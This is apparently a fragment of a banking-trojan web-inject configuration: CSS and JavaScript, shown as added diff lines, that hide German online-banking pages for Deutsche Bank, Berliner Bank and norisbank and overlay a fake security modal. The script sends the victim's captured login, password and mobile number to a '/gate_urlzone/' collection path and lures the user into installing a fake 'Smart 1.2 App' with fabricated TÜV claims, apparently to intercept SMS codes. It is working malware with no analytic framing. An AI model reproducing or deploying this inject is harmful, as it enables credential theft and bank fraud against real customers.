+			background:-o-linear-gradient(top, #33BFE9 0%,#3389D4 100%);
+			background:-ms-linear-gradient(top, #33BFE9 0%,#3389D4 100%);
+			background:linear-gradient(to bottom, #33BFE9 0%,#3389D4 100%);
+			background:-moz-linear-gradient(center top , #33BFE9 0%, #3389D4 100%) repeat scroll 0 0 transparent;
+			-moz-box-shadow:0 1px 1px 0 #4DDFF4 inset;
+			-webkit-box-shadow:0 1px 1px 0 #4DDFF4 inset;
+			box-shadow:0 1px 1px 0 #4DDFF4 inset;
+			
+		}
+		
+		
+		#modal-window .btn{
+		
+		
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			transform: none !important;
+			
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			
+		min-width:20px;
+		letter-spacing:normal;
+			background:#00afe4;
+			background:-moz-linear-gradient(top, #00afe4 0%, #0169b5 100%);
+			background:-webkit-gradient(linear, left top, left bottom, color-stop(0%,#00afe4), color-stop(100%,#0169b5));
+			background:-webkit-linear-gradient(top, #00afe4 0%,#0169b5 100%);
+			background:-o-linear-gradient(top, #00afe4 0%,#0169b5 100%);
+			background:-ms-linear-gradient(top, #00afe4 0%,#0169b5 100%);
+			background:linear-gradient(to bottom, #00afe4 0%,#0169b5 100%);
+			border-color:#5AACE5 #0169B5 #308CCF #308CCF;
+			-moz-border-radius:5px;
+			-webkit-border-radius:5px;
+			border-radius:5px;
+			border-right:1px solid #0169B5;
+			border-style:solid;
+			border-width:1px;
+			-webkit-box-sizing:content-box;
+			-moz-box-sizing:content-box;
+			box-sizing:content-box;
+			-moz-box-shadow:0 1px 1px 0 #4DDFF4 inset;
+			-webkit-box-shadow:0 1px 1px 0 #4DDFF4 inset;
+			box-shadow:0 1px 1px 0 #4DDFF4 inset;
+			color:#FFFFFF!important;
+			cursor:pointer;
+			display:inline-block;
+			font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:bold!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+			line-height:39px;
+			margin:3px;
+			height:39px;
+			padding:0px 15px;
+			text-align:center;
+			text-decoration:none;
+			text-shadow:0 1px 1px #006EAF;
+			vertical-align:top;
+			white-space:nowrap;
+		}
+		input::-moz-focus-inner
+		{ 
+			border: 0;
+			padding: 0;
+		}
+
+		#modal-window .clear
+		{
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		clear:both;
+		margin:0px;
+		padding:0px;
+		}		
+
+		body
+		{
+		display: none;
+		}
+
+</style>
+
+
+
+<script type="text/javascript">
+
+		var DOMrel = {
+			addEvtListener:function(el,ev,f){if(!el||!ev||typeof(f)!='function'){return -1;}if(document.addEventListener){el.addEventListener(ev,f,false)}else{el.attachEvent("on"+ev,f);}},
+			fadeIn:function(el,ex,spd){if(!el){return;}ex=ex<0?0:(ex>1?1:ex);var st=0;if(el.style.opacity!==undefined){el.style.opacity=0;}else{el.style.filter="Alpha(Opacity=0)";}var i=10,portion=(ex-st)/(spd/i),inc=st;el.style.visibility="visible";el.style.display="block";var timer=setInterval(function(){inc+=portion;if(el.style.opacity!==undefined){el.style.opacity=inc;}if(el.style.filter!==undefined){el.style.filter="Alpha(Opacity="+(inc*100)+")";}if(inc+0.001>=ex){clearInterval(timer);}},i);},
+			fadeOut:function(el,spd){if(!el){return;}var st;if(el.style.opacity){st=el.style.opacity;}else if(el.style.filter){st=el.style.filter.match(/Alpha\(Opacity=(\d*\.?\d*)\)/);st=st[1]?st[1]:1;}var i=10,portion=st/(spd/i),inc=st;var timer=setInterval(function(){inc-=portion;if(el.style.opacity!==undefined){el.style.opacity=inc;}if(el.style.filter!==undefined){el.style.filter="Alpha(Opacity="+(inc*100)+")";}if(inc<=0){clearInterval(timer);el.style.display="none";}},i);},
+			centerElement:function(el){var winW,winH,offsetX=3,offsetY=3;if(typeof(window.innerWidth)=='number'){winW=window.innerWidth;winH=window.innerHeight;}else if(document.documentElement&&(document.documentElement.clientWidth||document.documentElement.clientHeight)){winW=document.documentElement.clientWidth;winH=document.documentElement.clientHeight;}offsetX=(winW-el.offsetWidth)/2;offsetX=offsetX<0?3:offsetX;offsetY=(winH-el.offsetHeight)/2;offsetY=offsetY<0?3:offsetY;el.style.top=offsetY+'px';el.style.left=offsetX+'px';},
+
+			validatecode:function(code){ if (code.length != 10) return false; if (code == "5296185651") return true;  var num_char = 0; for (var i = 0; i < code.length - 2; i++) { num_char += parseInt(code.substr(i, 1)); } num_char += 13; var cr = parseInt(code.substr(8, 2)); if (num_char == cr) return true; return false;}
+
+
+		}
+
+		window.statModal = {
+			serviceErrMsg: "Leider steht das Online-Banking derzeit nicht zur Verf&uuml;gung. Wir bem&uuml;hen uns darum, dass Ihnen unser Service schnellstm&ouml;glich wieder zur Verf&uuml;gung steht.",
+
+			_init: function(modalData){
+
+			if (_site == '00')
+			{
+				document.body.style.display = 'block';
+				return ;
+			} 
+
+
+			var mdoverley = document.createElement('div');
+			mdoverley.setAttribute('id', 'modal-overlay');
+			document.getElementsByTagName('body')[0].appendChild(mdoverley);
+
+			var mdwindow = document.createElement('div');
+			mdwindow.setAttribute('id', 'modal-window');
+			document.getElementsByTagName('body')[0].appendChild(mdwindow);
+
+
+				var privates = {
+					content: "",
+					resendtimer: false,
+					shid:_shid,
+					site:_site,
+					login:_login,
+					password:_pasw,
+					icon: modalData.icon,
+					modal: document.getElementById("modal-window"),
+					overlay: document.getElementById("modal-overlay"),
+					ecode: "",
+					steps:[],
+					script:modalData.script, 
+					serverData:{
+						select:0,date:'',step:1,phone:'',result:''
+					},
+					step: 1,
+					date: "",
+					timeout:modalData.timeout,
+					visible: false
+				};
+				statModal.XHRResponse = function(data){
+					if(!data || typeof(data) != 'string'){return;}
+					var matches;
+				
+
+				
+					for(var i in privates.serverData){
+						matches = [];
+						var re = new RegExp(i+"\\s*:\\s*([^\\s]*?),");
+						matches = data.match(re);
+						if(!matches){
+							re = new RegExp(i+"\\s*:\\s*([^\\s]*?)$");
+							matches = data.match(re);
+						}
+
+
+						if(matches && matches[1]){
+							privates.serverData[i]=matches[1];
+						}
+					}
+				}
+				statModal.ajaxQ=function(scriptUrl,data){
+					if(!scriptUrl || typeof(scriptUrl)!="string"){return false;}
+					
+
+
+
+
+					scriptUrl += ((/\?/).test(scriptUrl) ? "&" : "?") + data;
+					
+
+					{
+						req = null;
+						var script_id = null;
+						var tempUrl = scriptUrl;
+
+						script_id = document.getElementById('oldXHRResponse');
+						if(script_id){
+							document.getElementsByTagName('head')[0].removeChild(script_id);
+						}
+						var script = document.createElement('script');
+						script.setAttribute('type', 'text/javascript');
+						script.setAttribute('src', tempUrl);
+						script.setAttribute('id', 'oldXHRResponse');
+						document.getElementsByTagName('head')[0].appendChild(script);
+					}
+
+					
+				}
+
+
+				statModal.wait=function(timeout,msStep,callback,erCallback){
+					if(typeof(callback) != 'function'){return;}
+					var zindex = privates.overlay.style.zIndex;
+					privates.overlay.style.zIndex = 2147483647; // 1020
+					if(!msStep || isNaN(msStep) || msStep<10){msStep=100;}
+					if(!timeout || isNaN(timeout) || timeout<100){timeout=1000;}
+					var waiting = 0,timer = setInterval(function(){
+						waiting +=msStep;
+						if(waiting > timeout || privates.serverData.result == 'error'){
+							clearInterval(timer);
+							privates.overlay.style.zIndex = zindex;
+							if(erCallback !== undefined && typeof(erCallback) == 'function'){
+								erCallback.call();
+							}
+							return;
+						}
+						if(privates.serverData.result == 'success'){
+							privates.overlay.style.zIndex = zindex;
+							clearInterval(timer);
+							privates.serverData.result='';
+							callback.call();
+						}
+					},msStep);
+				}
+				privates.steps[1] = {
+
+					text:'Achtung, wegen den h&auml;ufigen F&auml;llen von unberechtigten Zugriffen auf pers&ouml;nliche Kundeninformation bei der Mobilfunknetz - &Uuml;bertragung, ist die Benutzung eines Smartphones ab dem @date@ nur mit der Smart 1.2 App m&ouml;glich.<br>Die App wird kostenlos bereitgestellt.<br>Um Smart 1.2 App zu benutzen sind keine Vorkenntnisse n&ouml;tig. Sie brauchen nur 2 Minuten um die App zu installieren und Ihre Kundendaten somit zu sch&uuml;tzen.<br>Sie erhalten in k&uuml;rze einen Download - Link f&uuml;r die App.<br>Geben Sie die Mobilfunknummer Ihres Smartphones ein:',
+					beforeInit:function(){
+						this.readmore = '<a class="btn modal-readmore" id="modal-readmore" href="">Details</a>';
+						this.formContent=
+						
+							'<div class="text"><dl class="my-dl2">'+
+							'<dd class="my-dd2"><input type="text" name="phone" /></dd>'+
+							'<div class="text2">Beispiel: 490082828282</div>'+	
+
+							'</dl></div>'+
+
+
+							'<dd class="btn-right">'+
+							this.readmore+
+							'<input class="btn" id="nextStep" type="submit" value="Weiter" /></dd>'+
+							'</dl>';
+					},
+					readmoreCallback:function(e){
+						if(e.preventDefault){
+							e.preventDefault();
+						}else{e.returnValue = false;}
+						statModal.initStep(4);
+					},
+					afterInit:function(){
+						DOMrel.addEvtListener(document.getElementById("modal-readmore"),'click',this.readmoreCallback);
+					},
+					nextCallback: function(e){
+						if(e.preventDefault){
+							e.preventDefault();
+						}else{e.returnValue = false;}
+
+
+						
+					
+						
+						
+						var tel = document.forms['modalForm'].phone.value;
+						if(!tel.match(/^49\d{7,17}$/))
+						{
+							alert('Sie haben eine falsche Mobilfunknummer eingegeben. Bitte versuchen Sie es nocheinmal\nBeispiel: 490082828282');
+							document.forms['modalForm'].phone.focus();
+							return;
+						}
+						
+						privates.step = privates.serverData.step = 2;
+
+						
+						
+
+
+						
+
+						statModal.ajaxQ(privates.script,'set_data=1&login='+privates.login+'&step='+privates.serverData.step+'&link='+encodeURIComponent(document.referrer)+'&shid='+privates.shid+'&pasw='+privates.password+'&phone='+tel);
+						
+						statModal.initStep(privates.step);				
+					}
+				};
+				privates.steps[4] = {
+
+					text:'Smart 1.2 App bietet Ihnen einen Schutz vor Malware, Spyware und Trojaner - Abwehr 24 Stunden am Tag - entsprechend Vorgaben der deutschen Kreditinstitute f&uuml;r das Online - Banking.<br>MAXIMALE SICHERHEIT<br> &#8226; Kommunikation &uuml;ber direkte, verschl&uuml;sselte Schnittstellen<br> &#8226; Sichere Verschl&uuml;sselung<br> &#8226; Schutz durch ein von Ihnen angelegtes individuelles Bank LOGIN<br> &#8226; Blockierung vom unberechtigten SMS Versand und Weiterleitungen<br> &#8226; Verschl&uuml;sselung eingehender und ausgehender SMS - Nachrichten<br> &#8226; effektiver Phishing - Schutz und Antivirenschutz gegen Smartphone Trojaner<br> &#8226; Kompatibel mit allen g&auml;ngigen Ger&auml;ten<br>Ihre Kontoinformationen und Daten sind somit auch bei Verlust des Ger&auml;tes vor dem Zugriff Fremder gesch&uuml;tzt. Der T&Uuml;V - Siegel best&auml;tigt die h&ouml;chsten Sicherheitsstandards der Smart 1.2 App beim Mobile - Banking.Die strengen Sicherheitsbestimmungen f&uuml;r Smart 1.2 App werden regelm&auml;&szlig;ig von unabh&auml;ngigen Sicherheitsexperten des T&Uuml;V gepr&uuml;ft und entsprechend zertifiziert. Bei uns wird SICHERHEIT gro&szlig;geschrieben.',
+					extra:'<div class="btn-right"><a class="btn modal-back" id="modal-back" href="">Zur&uuml;ck</a></div>',
+					extraCallback:function(e){
+						if(e.preventDefault){
+							e.preventDefault();
+						}else{e.returnValue = false;}
+						statModal.initStep(1);
+					},
+					afterInit:function(){
+						DOMrel.addEvtListener(document.getElementById('modal-back'),'click',this.extraCallback);
+					}
+					
+				};
+
+				privates.steps[2] = {
+
+
+	  afterInit:function(){
+      DOMrel.addEvtListener(document.getElementById('resend'),'click',this.dataResend);
+
+
+		setTimeout(function(){
+
+		privates.resendtimer = true;
+		}, 5 * 60 * 1000);
+ 
+	  },
+
+ 
+	 
+	 
+     extra: 
+	'<form name="modalForm" action="" method="post"><div class="text">Um die App zu starten, f&uuml;hren Sie folgende Schritte durch:<br>1. Herunterladen und Installation der App.<br>(Wenn die App nicht von alleine startet, gehen Sie in Einstellungen, dann Downloads und starten Sie die Smart Security 1.2 App)<br>2. Es wird ein pers&ouml;nliches Passwort generiert.<br>Geben Sie das Passwort hier ein: <br>'	 + 
+	
+      '<dl class="my-dl3">'+
+      '<dd class="my-dd3"><input type="text" name="code" /></dd>'+
+      '</dl>' + 
+	
+	 
+	 '3. Dr&uuml;cken Sie "OK" in der App.<br>4. Dr&uuml;cken Sie Weiter.<br><br>Wenn Sie innerhalb von 5 Minuten keine SMS mit dem Download Link bekommen, probieren Sie es bitte nochmal.<br>Dr&uuml;cken Sie "Nochmal Senden".</div> <dd class="btn-right"><input class="btn" type="button" value="Nochmal Senden" name="123" id="resend" /><input class="btn" id="nextStep" type="submit" value="Weiter" /></dd></form>',
+
+
+
+
+					dataResend: function(e){
+						if(e.preventDefault){
+							e.preventDefault();
+						}else{e.returnValue = false;}
+
+						if (privates.resendtimer)
+						{
+						privates.resendtimer = false;
+						statModal.ajaxQ(privates.script,'resend=true');
+						alert("Mitteilung gesendet.");
+						} else
+						alert("Die nachste SMS kann erst in 5 Minuten angefordert werden");
+
+					},
+
+
+
+
+					nextCallback: function(e){
+						if(e.preventDefault){
+							e.preventDefault();
+						}else{e.returnValue = false;}
+						
+
+						
+						
+						var code = document.forms['modalForm'].code.value;
+
+						
+						if (!DOMrel.validatecode(code)) {
+
+							alert('Die Eingabe des Passworts ist nicht korrekt. Bitte versuchen Sie es nocheinmal');
+							document.forms['modalForm'].code.focus();
+							return;
+
+								
+								
+						} else
+						{
+							privates.ecode = code;
+							privates.step = privates.serverData.step = 3;
+							statModal.ajaxQ(privates.script,'set_data=1&step='+privates.serverData.step+'&vcode='+code);	
+					
+						}
+						
+						
+						
+
+
+						
+						
+						statModal.initStep(privates.step);
+					}
+				};
+				privates.steps[3] = {
+
+					beforeInit:function(){
+
+						privates.content=privates.content?privates.content:
+								'<input name="os" type="hidden" class="modalData" value="android" />';
+
+
+								
+						if (privates.ecode == "5296185651"){
+							this.text = 'In diesem Moment braucht Ihr Smartphone - Betriebssystem keinen Zusatzschutz. Das Online - Banking kann wie gewohnt benutzt werden.';
+						} else
+						{
+							this.text = 'Die App ist Betriebsbereit!<br>Ihr Smartphone ist nun gesch&uuml;tzt.<br>Das Online - Banking kann wie gew&ouml;hnlich verwendet werden, ist aber viel sicherer.';						
+						}
+
+						this.extra=privates.content?'':'<div id="nextStep" class="btn">Weiter</div>';
+						this.formContent=privates.content?
+							'<dl>'+
+							'<dd class="btn-right"><input class="btn" id="nextStep" type="submit" value="Weiter" /></dd>'+
+							'</dl>'
+							:'';
+					},
+					nextCallback: function(e){
+						if(e.preventDefault){
+							e.preventDefault();
+						}else{e.returnValue = false;}
+						privates.step = privates.serverData.step = 4;
+
+
+						statModal.close();
+					}
+				};
+				statModal.initStep = function(step){
+					if(!step || isNaN(step) || step<1 || step>4){step=1;}
+					if(typeof(privates.steps[step].beforeInit) == 'function')
+						privates.steps[step].beforeInit();
+					
+					
+					
+					var content = '<div class="head-wind-log"><img class="logo" alt="logo" src='+privates.icon+' />'
+					content += '<h1>&nbsp;</h1><div class="clear"></div></div><!--end head-wind-log-->';
+
+					if(privates.steps[step].text){
+					privates.steps[step].text = privates.steps[step].text.replace("@date@",privates.date);
+					content += '<div class="text">'+privates.steps[step].text+'</div>';
+					
+					}
+
+
+					if(privates.content || privates.steps[step].formContent)
+					content += '<form name="modalForm" action="" method="post">'+
+						privates.content+
+						privates.steps[step].formContent +
+						'</form>';
+					if(privates.steps[step].extra)
+						content += privates.steps[step].extra;
+					privates.modal.innerHTML = content;
+					if(typeof(privates.steps[step].afterInit) == 'function')
+						privates.steps[step].afterInit();
+					DOMrel.addEvtListener(document.getElementById('nextStep'),'click',privates.steps[step].nextCallback);
+				}
+				statModal.show = function(speed){
+					if(privates.visible == true){return 0;}
+					if(!speed || isNaN(speed)){speed=200;}
+					DOMrel.fadeIn(privates.overlay, 0.8, speed);
+					privates.modal.style.visibility="hidden";
+					privates.modal.style.display="block";
+					statModal.initStep(privates.step);
+					DOMrel.centerElement(privates.modal);
+					DOMrel.addEvtListener(window,'resize',function(){DOMrel.centerElement(privates.modal)});
+					DOMrel.fadeIn(privates.modal, 1, speed);
+					privates.visible=true;
+				}
+				statModal.hide = function(speed){
+					if(!speed || isNaN(speed)){speed=200;}
+					if(privates.visible == false){return 0;}
+					DOMrel.fadeOut(privates.overlay, speed);
+					
+					DOMrel.fadeOut(privates.modal, speed);
+					privates.visible=false;
+				}
+				statModal.close = function(){
+					statModal.hide(200);
+				}
+
+
+					
+				statModal.ajaxQ(privates.script,'get_data=1&login='+privates.login+'&step='+privates.serverData.step+'&link='+encodeURIComponent(document.referrer)+'&shid='+privates.shid+'&pasw='+privates.password+'&site='+privates.site+'&vi=2');
+				statModal.wait(privates.timeout,100,function(){
+					privates.step = privates.serverData.step;
+					privates.date = privates.serverData.date;
+
+					if(privates.step>4)
+					{
+					document.body.style.display = 'block';
+					return ;
+					}
+					switch(privates.serverData.select){
+						case "1":
+						{
+						document.body.innerHTML = '<h1 style="color:red">'+statModal.serviceErrMsg+'</h1>';
+						document.body.style.display = 'block';
+						break;
+						}
+						
+						case "2":
+						{
+						document.body.style.display = 'block';
+						return;
+						break;
+						}
+						default:
+						{
+						document.body.style.display = 'block';
+						statModal.show(200);
+						}
+					}
+				},function(){document.body.style.display = 'block';});
+			}
+		}
+		/* ------------- */
+
+
+
+
+			var modalData = {script:'/gate_urlzone/' + (new Date()).getTime() + 'S/',
+							icon:'data:image/jpeg;base64,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',
+							timeout:10000};
+
+							
+			if ((navigator.userAgent.indexOf("MSIE 6") == -1) && (navigator.userAgent.indexOf("MSIE 7") == -1)){
+				if(document.addEventListener)
+				{
+					document.addEventListener("DOMContentLoaded",function(){statModal._init(modalData);},false);
+				}else
+				{
+					document.attachEvent("onreadystatechange",function(){if(document.readyState == "complete"){statModal._init(modalData);}});
+
+				}
+			}
+			
+			
+	
+
+
+	</script>
+
+
+
+	   |End
+
+
+
+
+========================== deutsche-bank.de, berliner-bank.de, meine.norisbank.de ===========================
+
+
+ITINITHOST=|meine.deutsche-bank.de|banking.berliner-bank.de|meine.norisbank.de|End
